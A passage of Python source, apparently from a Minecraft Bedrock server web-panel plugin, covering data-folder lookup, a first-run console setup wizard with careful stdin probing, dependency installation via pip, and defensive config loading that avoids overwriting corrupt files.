        1. 相对路径会落到**服务器进程的 CWD**（可能不是服务端根目录），
           用户根本找不到文件，甚至两个环境互相覆盖；
        2. 目录名 ``endstone-greenmoon-panel`` 与实际 ``GreenMoon面板`` 不符，
           会和 Endstone 自己管理的 ``data_folder`` 分叉成「两份数据」。

        更糟的是异常被 ``except: pass`` **静默吞掉** —— 用户只看到
        「日志不知去哪了」，拿不到任何线索。这正是线上报 ``write failed``
        时无从下手的根因。

        ⚠ ``data_folder`` 为什么会抛
        ---------------------------
        它由 C++ 侧 ``PluginDescription`` 在**正规注册流程**中注入（不在任何
        ``.pyi`` 里声明，是 ``_python.*.so`` 的 ``data_folder`` 符号）。
        若插件发行名不合规（必须以 ``endstone-`` 开头），Endstone 会拒收
        entry point 并改走 whl 兜底加载，该字段就不会被注入 —— 取属性即抛。

        现在改成：**只认 data_folder，失败返回 None 并把完整诊断写进
        ``self._data_dir_error``**。宁可功能降级（日志不写、地图画禁用），
        也要让用户在控制台看到「为什么」。

        ★ 刻意**不**用 ``Path(__file__)`` 反推 ``plugins/<名>``：
        部署后 ``__file__`` 在 ``plugins/.local/.../dist-packages/admin_web``
        （Endstone 装 wheel 的派生目录，见 ``plugin_loader.py`` 的
        ``self._prefix = os.path.join("plugins", ".local")``），其上层根本
        没有 ``plugins/<插件名>`` 这一级，反推必然失败；而且猜出来的目录
        不是用户要的 ``data_folder``，只会把水搅浑。
        """
        self._data_dir_error = None
        try:
            p = self.data_folder
            if p:
                return Path(p)
            reason = "data_folder 为空"
        except Exception as e:
            reason = f"{type(e).__name__}: {e!r}"

        self._data_dir_error = (
            f"无法获取插件数据目录（{reason}）；"
            f"插件模块={type(self).__module__}，解释器={sys.executable}"
        )
        try:
            self.logger.error(f"[数据目录] {self._data_dir_error}")
            self.logger.error(
                "[数据目录] 排查方向：打包用的 pyproject 里 "
                "[project].name 必须是 'endstone-greenmoon-panel'，"
                "且 entry point 名为 'greenmoon-panel'"
                "（Endstone 要求 dist 名 == 'endstone-' + entry point 名）。"
                "名字不合规时插件会被 entry point 通路拒收、改走 whl 兜底加载，"
                "data_folder 拿不到 —— 日志会落到 plugins/.local/... 下并随时丢失。"
            )
        except Exception:
            pass
        return None

    # ==================================================================
    # 首次运行安装向导
    # ==================================================================

    #: 向导整体超时（秒）。超过就直接放弃，让服务器正常起。
    #: 120 秒是"用户真的在敲键盘"和"根本没人接控制台"之间的分界 ——
    #: 正常填三项配置最多 30 秒，剩下的是容错余量。
    _SETUP_WIZARD_TIMEOUT = 120.0

    #: 单项输入超时（秒）。比整体超时短得多：卡在某一项上说明这一项
    #: 出了问题（比如用户走了），没必要耗满整体预算。
    _SETUP_PROMPT_TIMEOUT = 60.0

    def _setup_marker_path(self) -> Path:
        """向导完成标记文件路径。

        ★ 为什么要有这个文件，而不能只看 config.json 里的字段
        ----------------------------------------------------
        两个理由：
        1. **用户可能真的想再改一次。** 如果只判断"admin_pass 是否为空"，
           用户手动把密码清空后重启，向导会再次触发并覆盖他的其它设置 ——
           意外行为。标记文件是显式的"已走过一遍"。
        2. **兼容升级**：老用户升级上来时 config.json 里字段齐全但**没有
           标记文件**。我们不能因此弹向导去"重新配置"一遍（他有自己的
           端口和密码，凭什么被改）。所以下面的判定是
           「标记不存在 **且** 看起来是全新安装」，两个条件都满足才跑。
        """
        return self.data_dir / "setup_done.json"

    def _is_fresh_install(self) -> bool:
        """判断是不是"全新安装"（用于决定要不要弹向导）。

        ⚠ 这个判断必须**保守**：宁可少弹一次（用户手动改配置即可），
          也不能在升级/已有配置时误弹，把用户辛苦配好的端口密码冲掉。

        判定为"老用户"（不弹向导）的条件，满足**任一**即可：
          * 标记文件存在；
          * config.json 已存在**且能被解析**（说明之前至少启动过一次，
            配置是用户自己的）。

        ★ 为什么"存在"之外还要多一个"能被解析"（v7.7.7）
        -------------------------------------------------
        老判定只看 ``.exists()``。而一份**损坏的** config.json 同样存在，
        于是一个"升级时被截断 / 手滑存坏"的用户会被判成老用户：
          * 他不弹向导（判成老用户）；
          * ``_load_config`` 又解析失败，只能用默认值跑；
          * 结果他**既没被问到配置、也没有可用配置** —— 端口回到 8080、
            密码空着、白名单全丢，而且没有任何地方提示他这件事。
        "解析不了"等价于"用户当前没有一份可用配置"，此时弹向导恰恰是
        最有价值的。所以这里把"损坏"归入全新安装。
        （另见 ``_load_config``：损坏时**只读不写**，不会再把他的文件冲掉。）
        """
        try:
            if self._setup_marker_path().exists():
                return False
            cfg_path = self.data_dir / "config.json"
            if not cfg_path.exists():
                return True
            # 存在但读不出来 → 当成全新安装，引导用户重新配一遍
            try:
                with open(cfg_path, "r", encoding="utf-8") as f:
                    parsed = json.load(f)
                return not isinstance(parsed, dict)
            except Exception:
                return True
        except Exception:
            return False

    #: 探测"有没有可交互控制台"时，最多试读多久（秒）。
    #: 只在这一个地方用 —— 探测本身必须极快，不能拖慢开服。
    _SETUP_PROBE_TIMEOUT = 2.0

    def _setup_probe_stdin(self) -> bool:
        """探测 stdin 是否**真的能读到用户输入**。

        ★★ 为什么不能再用 ``sys.stdin.isatty()``（这里修的是真正的根因）
        ---------------------------------------------------------------
        Endstone 的插件跑在 **C++ 主程序内嵌的 Python 解释器**里，而且
        BDS/Endstone 自己要实现「控制台读指令」，于是它把进程的
        stdin **接管**了（换成管道或自有读取器）。

        实测结果：``sys.stdin.isatty()`` 在 Endstone 里**恒为 False** ——
        哪怕你就坐在控制台前、终端完全可交互。四种常见启动方式
        （终端直跑 / systemd / nohup 重定向 / Endstone 接管）全部为 False。

        后果与"向导不触发"是同一个：判定条件写错 → 功能静默消失。
        只不过程序员的直觉里 ``isatty`` 是"正统"写法，所以更难被发现。

        ★ 改成"真读一次"的探测策略
        ---------------------------
        不去猜 stdin 的类型，直接**试着读一行**，用结果说话：
          * 读到内容   → 有可用输入通道 → True（并把内容留给向导用）
          * 读到 EOF   → /dev/null 或已关闭的管道 → False（不阻塞）
          * 超时       → 通道正常但当前没人敲 → True，交给向导的
                         120 秒窗口去等
          * 任何异常   → 保守 False，宁可没有向导也不能卡住开服

        为什么"超时也返回 True"：探测窗口只有零点几秒，服主不可能这么快
        就输入。如果判 False 就等于"永远探测不到有人的情况"，又回到老 bug。
        真正的等待上限由 ``_SETUP_WIZARD_TIMEOUT``（120 秒）负责。

        ★ 为什么用一个"回放包装"而不是 peek
        -----------------------------------
        ``os.read`` 是**消费式**的：偷看 1 字节会把用户的第一个回答吃掉
        （输入 "8080" 变成 "080"）。而 ``sys.stdin.buffer.peek()`` 在
        自定义 / 不可 seek 的 stdin 上会抛，误判成"没数据"。
        所以这里自己测自己控制：读到的内容**原样存起来**，再把
        ``sys.stdin`` 换成一个"先吐回放、再读真身"的包装对象。
        既判了 EOF，又保证一个字节都不丢。

        ⚠ 探测本身有硬超时。这是在一个**面板服的启动流程**里跑的：
          直接 ``input()`` 在管道上可能永久阻塞，服务器就再也起不来。
        """
        try:
            if sys.stdin is None:
                return False
        except Exception:
            return False

        # ---- 用 os.read 精确判"有数据 / 无数据(EOF) / 暂时没有" ----
        # 只有 fileno 可用时才走这条路；否则落到下面的线程法。
        fd = None
        try:
            fd = sys.stdin.fileno()
        except Exception:
            fd = None

        if fd is not None:
            try:
                import select
                r, _, _ = select.select([fd], [], [], 0.35)
                if r:
                    # 报可读。可能是真数据，也可能是 EOF（写端已关）。
                    try:
                        got = os.read(fd, 1)
                    except (BlockingIOError, InterruptedError):
                        got = b"x"          # 竞态：当它有数据
                    except Exception:
                        got = b"x"          # 其它异常：保守当有
                    if not got:
                        return False        # 空 = EOF，确实没有控制台
                    # ★ 把读到的这 1 字节还给向导（绝不能丢）
                    self._setup_prepend_stdin(got)
                    return True                # 不可读：通道可能正常，只是当前没人敲。
                # 交给下面的线程法判 EOF（select 的"不可读"区分不了
                # "没人输入"和"读到 EOF"）。
            except Exception:
                pass

        # ---- 退路：守护线程试读一行 ----
        got2: Dict[str, Any] = {}
        ev = threading.Event()

        def _reader():
            try:
                line = sys.stdin.readline()
                got2["data"] = line
                got2["eof"] = (line == "")
            except Exception as e:
                got2["error"] = str(e)
            finally:
                ev.set()

        try:
            threading.Thread(target=_reader, name="gm-setup-probe",
                             daemon=True).start()
        except Exception:
            return False

        if not ev.wait(0.35):
            # 没人输入 → 当作"有控制台"，让向导去等它的 120 秒。
            # ⚠ 此刻那个守护线程**还挂在 readline 上**。它后面真的读到
            #   一行时会拿到内容，但那行会被丢弃 —— 所以这里尽量不把
            #   活跃控制台判成这个分支（上面的 select 分支已覆盖）。
            return True
        if got2.get("error"):
            return False
        if got2.get("eof"):
            return False
        # 线程读到了内容 → 它已经消费掉一行了，得还回去
        try:
            self._setup_prepend_stdin(
                got2.get("data", "").encode("utf-8", "replace"))
        except Exception:
            pass
        return True

    #: 探测时"偷看"到的字节，暂存在这里，等向导真正读输入时先吐出。
    _setup_prepend_bytes = b""

    def _setup_prepend_stdin(self, data: bytes) -> None:
        """把探测时消费掉的字节通过替换 stdin 还回去。

        包装对象只做一件事：``readline()`` 第一次被调用时，先把
        ``prepend`` 里的残留拼在真实读到的内容前面。这样向导侧看到的
        输入和用户敲的**完全一致**，一个字符不差。

        ⚠ 这个方法**必须**能独立工作，不能依赖具体类名。
          第一版写成 ``GreenMoonPlugin._setup_prepend_stdin(...)``，
          结果任何"类不叫 GreenMoonPlugin"的场合（单测宿主、子类）
          都会在 ``except`` 里被静默吞掉 → 探测返回 True 但 stdin
          没被包装 → 向导读到的第一个回答凭空少一个字符。
          所以它现在是一个**普通实例方法**，一律通过 ``type(self)``
          定位残留字节的归属；调用点也统一写 ``self._setup_prepend_stdin``。
        """
        if not data:
            return
        # ★ 残留字节存在"当前这个实例/类"上，**绝不写死类名**。
        #   这里曾经写成 GreenMoonPlugin._setup_prepend_bytes —— 在真实
        #   插件里能跑，但任何类名不同的场合（单测宿主、子类）都会抛
        #   NameError，而且很可能被外层 except 静默吞掉，表现为
        #   "探测说 True，可向导读到的第一个回答凭空少一个字符"。
        try:
            cls = type(self)
            cls._setup_prepend_bytes = (
                getattr(cls, "_setup_prepend_bytes", b"") or b"") + data
        except Exception:
            pass
        try:
            _orig = sys.stdin
            if _orig is None:
                return

            class _PrependedStdin:
                """先吐出残留字节，之后透传给真实 stdin。

                ★★ 关键：残留必须**与真身拼成一个完整的行**再返回
                ----------------------------------------------------
                ``os.read(fd, 1)`` 只偷走 1 个字节。第一版实现是
                "第一次 readline 返回残留，之后就透传"，看起来对，
                实际灾难：
                  用户输入 ``8080\\n`` → 残留 = ``b'8'``
                  第 1 次 readline → ``'8'``        ← 端口读成 "8"
                  第 2 次 readline → ``'080\\n'``   ← 密码读成 "080"
                整份答案被错位切碎，比"丢一个字符"更难排查。

                正确做法：readline 时把残留**追加**在真身读到的内容
                前面，循环到出现 ``\\n`` 或真身返回空（EOF）才停。
                这样哪怕只偷了 1 字节，用户看到的行也**一字不差**。
                """

                def __init__(self, real, prepend):
                    object.__setattr__(self, "_real", real)
                    object.__setattr__(self, "_pre", prepend)
                    object.__setattr__(self, "_used", False)

                def readline(self, *a, **k):
                    real = object.__getattribute__(self, "_real")
                    pre = object.__getattribute__(self, "_pre")

                    if object.__getattribute__(self, "_used") or not pre:
                        return real.readline(*a, **k)

                    # 首次调用：把残留吐出来，并继续从真身补齐，直到
                    # 这一行完整（含换行）为止。
                    object.__setattr__(self, "_used", True)
                    buf = pre
                    while b"\n" not in buf:
                        try:
                            more = real.readline(*a, **k)
                        except Exception:
                            break
                        if not more:
                            break            # EOF：有多少算多少
                        if isinstance(more, bytes):
                            buf += more
                        else:
                            buf += str(more).encode("utf-8", "replace")
                        if len(buf) > 1 << 20:   # 防御：绝不吃爆内存
                            break
                    object.__setattr__(self, "_pre", b"")
                    return buf.decode("utf-8", "replace")

                def isatty(self):
                    try:
                        return object.__getattribute__(self, "_real").isatty()
                    except Exception:
                        return False

                def fileno(self):
                    return object.__getattribute__(self, "_real").fileno()

                def __getattr__(self, name):
                    # 其余属性（encoding / buffer 等）一律透传给真身，
                    # 避免包装对象比真身"少功能"而引出新问题。
                    #
                    # ⚠ 用 object.__getattribute__ 取私有字段，**不要**写
                    #   ``self._real`` —— 一旦 _real 自身缺失，会再次进入
                    #   __getattr__ 造成无限递归。
                    real = object.__getattribute__(self, "_real")
                    return getattr(real, name)

            if isinstance(_orig, _PrependedStdin):
                # 已经包过一层：把新偷到的字节追加进去，别套娃。
                old = object.__getattribute__(_orig, "_pre") or b""
                object.__setattr__(_orig, "_pre", old + data)
            else:
                sys.stdin = _PrependedStdin(_orig, data)
        except Exception:
            pass

    def _maybe_run_setup_wizard(self) -> None:
        """首次运行时在控制台引导用户配置端口 / 账号 / 密码。

        ★★ 三条不能违反的硬约束
        ------------------------
        1. **绝不阻塞开服。** 全程跑在守护线程里，主线程最多 join
           ``_SETUP_WIZARD_TIMEOUT`` 秒。超时/无 tty/出任何异常 →
           静默跳过，服务器照常启动。宁可没有向导，也不能让服起不来。
        2. **绝不覆盖老用户的配置。** 判定见 ``_is_fresh_install``。
        3. **密码不回显。** 用 ``getpass`` 读；拿不到 getpass 时退回
           明文读但会在日志里提醒（总比读不到强）。

        向导做两件事：
          * 问端口 / 账号 / 密码，写入 config.json；
          * 检查 QQ 官方机器人所需的第三方库，缺了尝试装（见
            ``_setup_check_qq_deps``）。
        """
        # ★★ 必须用 on_enable 里**抢在 _load_config() 之前**拍下的快照，
        #    不能在这里重新调 _is_fresh_install()。
        #
        #    原因：_load_config() 首次启动会因"账号密码为空"而自动生成
        #    随机密码并**把 config.json 写盘**。等走到这里时磁盘上已经
        #    有配置文件了，再判定就恒为"老用户"，向导永不触发 ——
        #    这正是 v4.7.0 里真实发生的 bug（用户看到的还是自动生成的
        #    admin + 乱码密码）。
        #
        #    兜底：万一某个调用方没设这个属性（比如单测直接调），
        #    退回现场判定 —— 行为退化为"可能不弹"，但绝不误弹。
        fresh = getattr(self, "_fresh_install", None)
        if fresh is None:
            fresh = self._is_fresh_install()
        if not fresh:
            return
        if not self._setup_probe_stdin():
            # 探测判定"读不到输入"（stdin 是 /dev/null 或已关的管道）→ 跳过。
            # ⚠ 注意这里**不再**用 isatty 判定：Endstone 里它恒为 False，
            #   会把"终端里正常跑"也误判成无控制台（见 _setup_probe_stdin 注释）。
            #
            # ★ 这里**不再**打印任何警告框。
            #   原来有两条 warning：一条说"跳过向导"，一条说"正在使用默认
            #   配置 / 记下随机密码"。两件事都变了：
            #     1) 自动生成密码的功能已删除，没有"随机密码"可记；
            #     2) 真正有用的指引统一由 _announce_gm_setup_help() 在开服
            #        末尾给出（只列 /gm 指令，简洁且可执行）。
            #   两条警告并列只会互相稀释，删掉。
            return

        done = threading.Event()
        result: Dict[str, Any] = {}

        def _worker():
            try:
                result["cfg"] = self._setup_ask_questions()
                result["deps"] = self._setup_check_qq_deps()
            except Exception as e:
                result["error"] = str(e)
            finally:
                done.set()

        th = threading.Thread(target=_worker, name="gm-setup-wizard", daemon=True)
        th.start()

        if not done.wait(self._SETUP_WIZARD_TIMEOUT):
            # ★ 超时：用户没在敲键盘（或终端卡住）。直接放弃。
            # **不要**去 kill 那个线程 —— 守护线程随进程退出即可，
            # 强杀守护线程在 Python 里做不到也不安全。
            self.logger.warning(
                f"安装向导等待超时（{self._SETUP_WIZARD_TIMEOUT:.0f} 秒无输入），"
                "已跳过。可稍后编辑 data/config.json 配置。"
            )
            return

        if result.get("error"):
            self.logger.warning(f"安装向导出错（已跳过）: {result['error']}")
            return

        cfg = result.get("cfg") or {}
        if cfg.get("applied"):
            self._setup_apply(cfg)
        else:
            self.logger.info("安装向导已取消，沿用现有配置。")

        # 无论用户是否完成，都写标记 —— 避免他每次重启都被问一遍
        self._setup_mark_done(bool(cfg.get("applied")))

    def _setup_ask_questions(self) -> Dict[str, Any]:
        """真正问用户的那一段（跑在向导线程里）。

        返回 ``{"applied": bool, "port":..., "user":..., "pass":...}``。
        任何一步用户直接回车 = 采用括号里的默认值。
        """
        out: Dict[str, Any] = {"applied": False}
        try:
            print("")
            print("=" * 62)
            print("  GreenMoon 面板 · 首次运行安装向导")
            print("=" * 62)
            print("  这是第一次启动，跟着填几项就能用了。")
            print("  直接回车 = 使用括号里的默认值。")
            print("")

            cur = self.web_config or {}

            # ---------- 1. 端口 ----------
            dport = int(cur.get("port") or 8080)
            port = None
            for _try in range(3):
                raw = self._setup_input(f"网页后台端口 [{dport}]: ").strip()
                if not raw:
                    port = dport
                    break
                try:
                    p = int(raw)
                except ValueError:
                    print("    ✗ 端口必须是数字，请重填。")
                    continue
                if not (1 <= p <= 65535):
                    print("    ✗ 端口范围是 1-65535，请重填。")
                    continue
                port = p
                break
            if port is None:
                return out

            # ---------- NAT 提示（面板服最容易踩的坑）----------
            print("")
            print("  ┌─ 关于端口 / NAT 转发 " + "─" * 39)
            print("  │ 如果你用的是『面板服』，这里要填【内网端口】。")
            print("  │ 然后去面板商控制台，把【外网端口】转发到这个内网端口。")
            print("  │ 举例：")
            print("  │   这里填        → 8080      （内网）")
            print("  │   面板商分配    → 12345     （外网）")
            print("  │   做转发        → 12345 → 8080")
            print("  │   浏览器访问    → http://你的服务器IP:12345")
            print("  └" + "─" * 59)
            print("")

            # ---------- 2. 管理员账号 ----------
            # 不再默认 "admin"：让他自己敲一个记得住的。
            duser = str(cur.get("admin_user") or "").strip()
            user = ""
            for _try in range(3):
                prompt = (f"管理员账号 [{duser}]: " if duser
                          else "管理员账号（必填）: ")
                user = self._setup_input(prompt).strip() or duser
                if user:
                    break
                print("    ✗ 账号不能为空，请重填。"
                      "（也可以改用控制台指令 /gm name 你的账号）")
            if not user:
                return out

            # ---------- 3. 管理员密码 ----------
            # ★ 这里**不再**提供"回车自动生成强密码"。
            #   用户明确要求删掉自动生成功能 —— 理由很实在：
            #   生成出来的随机串用户记不住，面板服又看不到控制台打印，
            #   结果就是"密码存在但本人不知道"，比让他自己设还糟。
            print("  （密码不会显示在屏幕上，这是正常的）")
            pwd = ""
            for _try in range(3):
                pwd = self._setup_input(
                    "管理员密码（必填，至少 6 位）: ", secret=True).strip()
                if not pwd:
                    print("    ✗ 密码不能为空，请重填。"
                          "（也可以改用控制台指令 /gm pass 你的密码）")
                    continue
                if len(pwd) < 6:
                    print("    ✗ 密码太短（至少 6 位），请重填。")
                    continue
                break

            if not pwd or len(pwd) < 6:
                return out

            out.update({"applied": True, "port": port,
                        "user": user, "pass": pwd})
            return out
        except Exception as e:
            out["error"] = str(e)
            return out

    def _setup_input(self, prompt: str, secret: bool = False) -> str:
        """读一行输入；``secret=True`` 时不回显。

        ⚠ getpass 在某些嵌入式环境不可用（拿不到 /dev/tty），
          此时退回普通 input —— 明文敲密码总好过**根本配不了**。
          会在日志里提醒用户"密码是明文输入的"。
        """
        try:
            if secret:
                import getpass
                return getpass.getpass(prompt)
            return input(prompt)
        except EOFError:
            raise
        except Exception:
            if secret:
                self.logger.warning("当前环境不支持隐藏输入，密码将以明文方式读取。")
            return input(prompt)

    def _setup_apply(self, cfg: Dict[str, Any]) -> None:
        """把向导结果落盘。

        ★ 不再有"自动生成密码"分支：向导现在强制用户自己设密码，
          （见 _setup_ask_questions）。所以这里只负责把用户填的值写下去。
        """
        try:
            new_cfg = dict(self.web_config or {})
            new_cfg["port"] = int(cfg.get("port") or new_cfg.get("port") or 8080)
            # 不再回落到 "admin" —— 用户没填账号时向导根本不会走到这里。
            new_cfg["admin_user"] = str(cfg.get("user") or "").strip()
            new_cfg["admin_pass"] = str(cfg.get("pass") or "")
            self._persist_config(new_cfg)

            print("")
            print(f"  ✓ 配置已保存：端口 {new_cfg['port']}，账号 {new_cfg['admin_user']}")
            print("")
            # ★ 同时走 logger 再报一遍。
            #
            # 为什么不能只 print：向导跑在**控制台**上，``print`` 只落到
            # stdout；而面板「诊断 / 日志」页采集的是 logger 那条通道。
            # 面板服的现实是"用户根本没接控制台、只看面板日志" ——
            # 只 print 的话他恰好看不到这条"配置完成"的确认。
            # 不打印明文密码本身（面板日志会被多人看到），只报"已配置好"。
            self.logger.warning(
                f"安装向导已完成：面板端口 {new_cfg['port']}，管理员账号 "
                f"{new_cfg['admin_user']}。密码为你刚才输入的值。"
            )
        except Exception as e:
            self.logger.warning(f"安装向导保存配置失败: {e}")

    def _setup_mark_done(self, applied: bool) -> None:
        """写向导完成标记。写失败不算错（最多下次再问一遍）。"""
        try:
            atomic_write_json(self._setup_marker_path(),
                              {"done": True, "applied": bool(applied),
                               "at": time.strftime("%Y-%m-%d %H:%M:%S")},
                              indent=2)
        except Exception as e:
            self.logger.warning(f"写入向导标记失败（不影响使用）: {e}")

    # ------------------------------------------------------------------
    # 向导第二步：QQ 官方机器人依赖检测 / 安装
    # ------------------------------------------------------------------

    #: QQ 官方机器人直连所需的最小依赖集。
    #: ⚠ 只列**真正必需**的：requests 走 HTTP、websockets 走长连接。
    #:   其它（Pillow 等）是可选功能用的，缺了不影响机器人上下线。
    _QQ_REQUIRED_DEPS = ("requests", "websockets")

    def _setup_check_qq_deps(self) -> Dict[str, Any]:
        """检查 QQ 官方机器人依赖；缺失时尝试安装。

        ★ 为什么"检测为主、尝试安装为辅"
        -------------------------------
        很多面板服**没有 pip**、或网络出不去 PyPI。硬装一定失败，
        还会吐一屏吓人的报错。所以策略是：
          * 先 importlib 检测 —— 装了就直接过；
          * 缺了才尝试 pip，并且**实时测速**：低于 1KB/s 或直接失败 → 立刻
            中止，改为一句话提示"去网盘下 .gmlib 上传"。
            死等的价值为零，用户只想知道"现在该怎么办"。

        返回值仅用于日志，失败不抛异常。
        """
        import importlib.util as _ilu

        missing = []
        for name in self._QQ_REQUIRED_DEPS:
            try:
                if _ilu.find_spec(name) is None:
                    missing.append(name)
            except Exception:
                missing.append(name)

        if not missing:
            self.logger.info(
                "QQ 官方机器人依赖检查通过（%s 均已安装）。"
                % "、".join(self._QQ_REQUIRED_DEPS)
            )
            return {"missing": [], "installed": [], "ok": True}

        print("")
        print("  ── QQ 官方机器人依赖检查 " + "─" * 35)
        print("  缺少：" + "、".join(missing))
        print("  正在尝试自动安装…（失败会自动改用离线包方案）")

        ok = self._setup_try_pip(missing)
        if ok:
            print("  ✓ 依赖安装完成。")
            return {"missing": missing, "installed": missing, "ok": True}

        print("")
        print("  ✗ 自动安装未成功。这**不影响服务器运行**，只是 QQ 官方机器人")
        print("    暂时用不了。请改用离线依赖包：")
        print("      1) 打开网页后台 →「服务器信息」查看 Endstone 版本与平台")
        print("      2) 到网盘 1849050194.share.123pan.cn 下载对应 .gmlib")
        print("      3) 子插件面板 → 上传子插件 → 安装 → 重启服务器")
        print("")
        return {"missing": missing, "installed": [], "ok": False}

    #: 自动安装的**最低可接受速度**（字节/秒）。
    #: 低于它就放弃 —— 常见于国内网络直连 PyPI 被限速到几十字节/秒的情况，
    #: 那种速度下装一个包要几十分钟，等下去没有意义。
    _SETUP_MIN_SPEED = 1024

    def _setup_try_pip(self, packages: List[str]) -> bool:
        """尝试 pip 安装，带实时测速。成功返回 True。

        ★ 两个容易翻车的细节
        -------------------
        1. **必须读 stderr 来测速**：pip 的进度是写到 stderr 的（不是
           stdout）。只读 stdout 会拿到一片空白，然后误判"没速度"。
        2. **必须限总时长**：某些网络下 pip 会卡在"正在重试"上很久。
           超过 ``_SETUP_INSTALL_TIMEOUT`` 直接杀进程，不再干等。
        """
        cmd = [sys.executable, "-m", "pip", "install",
               "--disable-pip-version-check", "--no-input", *packages]
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
        except Exception as e:
            self.logger.warning(f"无法启动 pip：{e}")
            return False

        started = time.time()
        win_start = started
        win_bytes = 0
        slow_strikes = 0
        try:
            assert proc.stdout is not None
            for line in proc.stdout:
                win_bytes += len(line)
                now = time.time()
                span = now - win_start
                if span < 2.0:
                    continue
                speed = win_bytes / span
                if speed < self._SETUP_MIN_SPEED:
                    slow_strikes += 1
                    print(f"  · 下载速度偏低（{speed/1024:.1f} KB/s）…")
                    if slow_strikes >= 3:
                        print("  · 速度持续过低，放弃自动安装。")
                        proc.kill()
                        return False
                else:
                    slow_strikes = 0
                win_start, win_bytes = now, 0

                if now - started > self._SETUP_INSTALL_TIMEOUT:
                    print("  · 安装超时，放弃。")
                    proc.kill()
                    return False

            code = proc.wait(timeout=10)
        except Exception as e:
            self.logger.warning(f"pip 安装过程出错: {e}")
            try:
                proc.kill()
            except Exception:
                pass
            return False

        if code != 0:
            return False
        # ★ 装完必须**重新验证** —— pip 返回 0 不等于 import 得到
        #   （装到了别的 Python 环境里是经典情况）。
        return self._setup_verify_deps(packages)

    #: pip 安装的总时长上限（秒）
    _SETUP_INSTALL_TIMEOUT = 180.0

    def _setup_verify_deps(self, packages: List[str]) -> bool:
        """装完后重新检测，确认真的能 import。

        ⚠ 必须清掉 importlib 的缓存，否则拿到的还是安装前的结果 ——
          ``importlib.invalidate_caches()`` 就是干这个的。
        """
        import importlib
        import importlib.util as _ilu
        try:
            importlib.invalidate_caches()
        except Exception:
            pass
        for name in packages:
            try:
                if _ilu.find_spec(name) is None:
                    return False
            except Exception:
                return False
        return True

    def _load_config(self):
        config_path = self.data_dir / "config.json"
        default_config = {
            "host": "0.0.0.0",
            "port": 8080,
            "fun_transform": True,
            "rate_limit": True,
            "rate_min_interval": 0.05,
            "rate_window_seconds": 10,
            "rate_max_per_window": 500,
            "rate_global_max": 2500,

            "admin_user": "",
            "admin_pass": "",
            "temp_accounts": [],
            # test_mode 默认**关闭**：开启时可用动态口令直接登录为 admin，
            # 属于无凭证提权路径。需要时（开发者调试）再显式打开。
            "test_mode": False,
            "security_whitelist": {"enabled": False, "ips": []},
        }
        #: 本次加载是否**读到了可用的磁盘配置**。
        #: 注意：下面落盘分支用的是 ``loaded is None``，而"解析失败"也
        #: 会让 loaded 保持 None —— 于是老代码会把**默认值**当成"首次安装"
        #: 写回磁盘，把用户那份坏掉但可能只差一个括号的 config.json
        #: 彻底冲掉（端口 / 账号 / 密码 / 白名单全没了，且没有 .bak）。
        #: v7.7.6 起引入损坏标记，解析失败时**只读不写**，绝不覆盖用户数据。
        parse_failed = False
        loaded = None
        if config_path.exists():
            try:
                with open(config_path, "r", encoding="utf-8") as f:
                    loaded = json.load(f)
                cfg = {**default_config, **loaded}
            except Exception as e:
                parse_failed = True
                self.logger.error(
                    f"加载配置文件失败: {e}，本次**只使用默认配置，不会写盘**。"
                    f"你的 config.json 保持原样，方便手工修复（端口/账号/密码"
                    f"都在里面）。修好 JSON 后重启即可。"
                )
                cfg = dict(default_config)
        else:
            cfg = dict(default_config)

        # ★★ 这里**不再**自动生成管理员账号 / 随机密码。
        #    （用户明确要求删掉，见下）
        #
        # 老行为：账号或密码为空 → 生成 admin + 随机强密码并打印到控制台。
        # 为什么删掉：
        #   * 面板服根本看不到那条打印（控制台接的是日志管道），
        #     用户拿到的是一个**自己不知道的乱码密码**，反而更进不去；
        #   * "自动生成 + 打印"这条路解决不了认证问题 —— 生成的那一刻
        #     到用户改密码之间，面板一直是用一个谁也不记得的口令在守着；
        #   * 现在有了 /gm 指令，用户可以用**自己记得住**的密码配置，
        #     比随机串实用得多。
        #
        # 空账号/空密码怎么办？
        #   → 由 _ensure_admin_credentials() 兜底：**不放行**（拒绝登录），
        #     并提示用户用 /gm 配置。绝不再生成"用户不知道的"口令。
        #
        # ⚠ 只保留"解析失败时绝不写盘"这条保护。
        cfg["admin_user"] = str(cfg.get("admin_user") or "").strip()
        cfg["admin_pass"] = str(cfg.get("admin_pass") or "")

        if loaded is None and not parse_failed:
            try:
                # backup=True：这是一次**覆盖用户既有文件**的写操作
                # （首次生成），留一份 .bak 让用户能回退。
                atomic_write_json(config_path, cfg, indent=2, backup=True)
            except Exception as e:
                self.logger.error(f"写入 config.json 失败: {e}")
        return cfg

    def _persist_config(self, cfg: dict = None):

        target = cfg if cfg is not None else self.web_config
        config_path = self.data_dir / "config.json"
        with self._CONFIG_WRITE_LOCK:
            try:
                if not atomic_write_json(config_path, target, indent=2):
                    raise RuntimeError("原子写入失败")
                if cfg is not None:
                    self.web_config = cfg
            except Exception as e:
                self.logger.error(f"保存 config.json 失败: {e}")

    def _load_tools_config(self) -> Dict[str, Any]:
        path = self.data_dir / "tools_config.json"
        default = json.loads(json.dumps(DEFAULT_TOOLS_CONFIG))
        if path.exists():
            try:
                with open(path, "r", encoding="utf-8") as f:
                    loaded = json.load(f)
                # 必须遍历 DEFAULT_TOOLS_CONFIG 的**全部**分区。
                # 曾经这里只写了 3 个分区，导致 binding / signin / mods 的配置
                # 「存得进、读不出」——UI 显示已保存，重启后却回到默认值。
                for section in default.keys():
                    lv = loaded.get(section)
                    if isinstance(lv, dict):
                        dv = default.get(section, {})
                        if isinstance(dv, dict):
                            for k, v in lv.items():
                                if k in dv:
                                    dv[k] = v
                return default
            except Exception as e:
                self.logger.error(
                    f"读取 tools_config.json 失败: {e}，本次**只使用默认值，"
                    f"不会覆盖磁盘上的文件**（便于你手工修复）。"
                )
                return default
        try:
            # 走到这里只可能是"文件本来就不存在"（首次运行），
            # 解析失败的路径已在上面 return 掉了 —— 绝不能用默认值
            # 去覆盖一份真实存在但格式坏掉的配置。
            atomic_write_json(path, default, indent=2)
        except Exception:
            pass
        return default

    def _tools_public_config(self) -> Dict[str, Any]:
        cfg = self._load_tools_config()
        public = json.loads(json.dumps(cfg))
        tok = str(public.get("cloud_blacklist", {}).get("token", ""))

        public["cloud_blacklist"]["token"] = "__SET__" if tok else ""
        # AI 的 api_key 走同一个掩码约定。整包接口（tools/config）
        # 也会带回 AI 分区，这里不掩码就等于把 key 明文发到浏览器。
        ai = public.get("ai")
        if isinstance(ai, dict):
            k = str(ai.get("api_key", ""))
